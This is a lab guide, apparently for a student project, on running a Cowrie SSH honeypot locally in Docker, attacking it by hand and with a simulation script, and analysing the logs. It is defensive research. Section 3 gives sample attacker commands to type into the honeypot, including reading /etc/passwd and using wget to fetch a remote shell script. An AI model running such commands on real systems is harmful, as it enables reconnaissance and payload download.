# Local lab guide (November)

Goal: run Cowrie on your own laptop, attack it yourself, and run the analysis
scripts on the logs. Nothing here is reachable from the internet, so it is safe
to do before ethics approval.

## 1. Install the tools (once)

| Tool | Windows | Mac |
|---|---|---|
| Docker Desktop | docker.com/products/docker-desktop (it will ask to enable WSL 2, say yes and restart) | same site, choose Apple Silicon or Intel |
| Python 3.10+ | python.org, tick "Add python.exe to PATH" | python.org or `brew install python` |
| SSH client | already built into Windows 10/11 (PowerShell) | already built in (Terminal) |

Then, in a terminal in the project folder:

```
pip install -r requirements.txt
```

## 2. Start the honeypot

```
cd lab
docker compose up -d
docker compose logs -f        # wait for "Ready to accept SSH connections", then Ctrl+C
```

## 3. Attack it yourself

By hand (any password works except `root`/`123456` for the root user):

```
ssh -p 2222 root@127.0.0.1
```

Type a few commands an attacker would (`uname -a`, `cat /etc/passwd`, `wget http://example.com/x.sh`),
notice the hostname is `web-prod-02`, then `exit`.

Then run the scripted attacker, which produces a brute-forcer, a recon bot and an intruder:

```
python simulate_attacker.py
```

If SSH complains that the host key changed (after you recreate the container), remove the old key with
`ssh-keygen -R "[127.0.0.1]:2222"`.

## 4. Copy the log out and analyse it

From the `lab` folder:

```
docker compose cp cowrie:/cowrie/cowrie-git/var/log/cowrie/cowrie.json ../data/logs/cowrie.json
cd ..
python analysis/parse_cowrie.py data/logs --out output
```

Open `output/summary.txt` and the CSV files in Excel. You should see the categories
`brute_force`, `intruder` and `malware_dropper`, and ATT&CK techniques such as T1082,
T1098.004 and T1105.

## 5. Try the blocklist check

```
python scripts/fetch_blocklists.py
python analysis/check_blocklists.py
```

Your own address (127.0.0.1) is not on any list, and the check uses snapshots taken *before*
each attack, so on lab data expect "no_snapshot" or 0%. That's correct. The point here is to make
sure the scripts run on your machine.

## 6. Stop and reset

```
cd lab
docker compose down          # stop, keep logs
docker compose down -v       # stop and DELETE the logs (fresh start)
```

## What to write down as you go (it becomes your Implementation chapter)

- Screenshots of: Docker running, your SSH session showing `web-prod-02`, the summary output.
- Every problem you hit and how you fixed it.
- Why each setting exists (ports bound to 127.0.0.1, hostname changed from Cowrie's default `svr04`,
  container read-only with all Linux capabilities dropped).
